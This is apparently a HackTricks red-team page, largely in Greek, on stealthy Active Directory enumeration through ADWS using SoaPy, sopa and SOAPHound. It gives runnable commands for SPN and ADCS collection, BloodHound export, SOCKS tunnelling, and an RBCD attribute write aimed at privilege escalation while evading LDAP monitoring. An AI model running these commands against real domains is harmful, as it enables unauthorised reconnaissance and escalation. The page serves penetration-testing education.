# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) είναι ενεργοποιημένο από προεπιλογή σε κάθε Domain Controller από τα Windows Server 2008 R2 και ακούει στην TCP θύρα 9389. Παρά το όνομα, δεν εμπλέκεται HTTP. Αντίθετα, η υπηρεσία εκθέτει δεδομένα σε στυλ LDAP μέσω ενός στοίβας ιδιόκτητων .NET framing πρωτοκόλλων:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Επειδή η κίνηση είναι ενθυλακωμένη μέσα σε αυτά τα δυαδικά SOAP frames και ταξιδεύει πάνω από μια ασυνήθιστη θύρα, η enumeration μέσω ADWS είναι πολύ λιγότερο πιθανό να επιθεωρηθεί, φιλτραριστεί ή να αναγνωριστεί με signature σε σχέση με την κλασική LDAP/389 & 636 κίνηση. Για τους χειριστές αυτό σημαίνει:

* Πιο stealthy recon – τα Blue teams συχνά επικεντρώνονται σε LDAP queries.
* Ελευθερία να συλλέγεις από non-Windows hosts (Linux, macOS) με tunnelling της 9389/TCP μέσα από SOCKS proxy.
* Τα ίδια δεδομένα που θα άφηνες μέσω LDAP (users, groups, ACLs, schema, etc.) και η δυνατότητα να κάνεις writes (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για RBCD).

Οι αλληλεπιδράσεις με ADWS υλοποιούνται πάνω σε WS-Enumeration: κάθε query ξεκινά με ένα `Enumerate` μήνυμα που ορίζει το LDAP filter/attributes και επιστρέφει ένα `EnumerationContext` GUID, ακολουθούμενο από ένα ή περισσότερα `Pull` μηνύματα που stream-άρουν μέχρι το server-defined result window. Τα contexts λήγουν μετά από ~30 λεπτά, οπότε τα εργαλεία είτε πρέπει να σελιδοποιούν τα αποτελέσματα είτε να σπάνε τα φίλτρα (prefix queries per CN) για να αποφύγουν την απώλεια κατάστασης. Όταν ζητάς security descriptors, καθόρισε τον έλεγχο `LDAP_SERVER_SD_FLAGS_OID` για να παραλείψεις τα SACLs, αλλιώς το ADWS απλά αφαιρεί το attribute `nTSecurityDescriptor` από την SOAP απάντηση του.

> ΣΗΜΕΙΩΣΗ: Το ADWS χρησιμοποιείται επίσης από πολλά RSAT GUI/PowerShell εργαλεία, οπότε η κίνηση μπορεί να αναμειχθεί με νόμιμη admin δραστηριότητα.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) είναι μια πλήρης re-implementation του ADWS protocol stack σε καθαρό Python. Δημιουργεί τα NBFX/NBFSE/NNS/NMF frames byte-for-byte, επιτρέποντας συλλογή από Unix-like συστήματα χωρίς να πειραχτεί το .NET runtime.

### Key Features

* Υποστηρίζει proxying μέσω SOCKS (χρήσιμο από C2 implants).
* Λεπτομερή search filters ταυτισμένα με LDAP `-q '(objectClass=user)'`.
* Προαιρετικές write operations (`--set` / `--delete`).
* BOFHound output mode για άμεση ingestion στο BloodHound.
* `--parse` flag για prettify timestamps / `userAccountControl` όταν απαιτείται human readability.

### Targeted collection flags & write operations

Το SoaPy περιλαμβάνει curated switches που αναπαράγουν τα πιο κοινά LDAP hunting tasks πάνω σε ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, καθώς και raw `--query` / `--filter` knobs για custom pulls. Συνδύασέ τα με write primitives όπως `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) και `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Χρησιμοποιήστε τον ίδιο host και τα ίδια διαπιστευτήρια για να οπλοποιήσετε άμεσα τα ευρήματα: dump RBCD-capable objects με `--rbcds`, στη συνέχεια εφαρμόστε `--rbcd 'WEBSRV01$' --account 'FILE01$'` για να στήσετε μια Resource-Based Constrained Delegation chain (βλ. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) για την πλήρη διαδρομή κατάχρησης).

### Εγκατάσταση (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - Ένας πρακτικός πελάτης για ADWS σε Golang

Παρόμοια με το soapy, [sopa](https://github.com/Macmod/sopa) υλοποιεί το πρωτόκολλο ADWS (MS-NNS + MC-NMF + SOAP) σε Golang, εκθέτοντας flags γραμμής εντολών για την αποστολή κλήσεων ADWS όπως:

* **Αναζήτηση & ανάκτηση αντικειμένων** - `query` / `get`
* **Κύκλος ζωής αντικειμένου** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Επεξεργασία χαρακτηριστικών** - `attr [add|replace|delete]`
* **Διαχείριση λογαριασμού** - `set-password` / `change-password`
* και άλλα όπως `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, κ.λπ.

## SOAPHound – Συλλογή ADWS υψηλού όγκου (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) είναι ένας .NET συλλέκτης που διατηρεί όλες τις LDAP αλληλεπιδράσεις μέσα στο ADWS και εξάγει BloodHound v4-compatible JSON. Δημιουργεί μια πλήρη cache των `objectSid`, `objectGUID`, `distinguishedName` και `objectClass` μία φορά (`--buildcache`), στη συνέχεια την επαναχρησιμοποιεί για υψηλού όγκου `--bhdump`, `--certdump` (ADCS), ή `--dnsdump` (AD-integrated DNS) περάσματα ώστε μόνο ~35 κρίσιμα χαρακτηριστικά να βγαίνουν από τον DC. Το AutoSplit (`--autosplit --threshold <N>`) κατακερματίζει αυτόματα τα ερωτήματα με βάση το CN prefix για να παραμείνει κάτω από το 30-λεπτο timeout του EnumerationContext σε μεγάλα forests.

Τυπική ροή εργασίας σε ένα operator VM που είναι domain-joined:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON slots directly into SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit makes SOAPHound resilient on multi-million object forests while keeping the query count lower than ADExplorer-style snapshots.

## Κρυφή ροή εργασίας συλλογής AD

Η παρακάτω ροή εργασίας δείχνει πώς να απαριθμήσετε **domain & ADCS objects** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να εντοπίσετε διαδρομές επίθεσης που βασίζονται σε πιστοποιητικά — όλα από Linux:

1. **Tunnel 9389/TCP** από το δίκτυο-στόχο στο μηχάνημά σας (π.χ. μέσω Chisel, Meterpreter, SSH dynamic port-forward, κ.λπ.). Εξάγετε `export HTTPS_PROXY=socks5://127.0.0.1:1080` ή χρησιμοποιήστε το `--proxyHost/--proxyPort` του SoaPy.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Συλλέξτε αντικείμενα σχετικά με το ADCS από το Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Μετατροπή σε BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Ανεβάστε το ZIP** στο BloodHound GUI και τρέξτε cypher queries όπως `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψετε μονοπάτια κλιμάκωσης πιστοποιητικών (ESC1, ESC8, κ.ά.).

### Εγγραφή του `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Συνδυάστε αυτό με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη **Resource-Based Constrained Delegation** αλυσίδα (βλ. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Σύνοψη εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, ανάγνωση/εγγραφή |
| ADWS dump υψηλού όγκου | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, λειτουργίες BH/ADCS/DNS |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει αρχεία καταγραφής SoaPy/ldapsearch |
| Συμβιβασμός πιστοποιητικού | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να δρομολογηθεί μέσω του ίδιου SOCKS |
| ADWS enumeration & αλλαγές αντικειμένων | [sopa](https://github.com/Macmod/sopa) | Γενικός client για αλληλεπίδραση με γνωστά ADWS endpoints - επιτρέπει enumeration, δημιουργία αντικειμένων, τροποποιήσεις attributes, και αλλαγές κωδικών πρόσβασης |

## Αναφορές

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
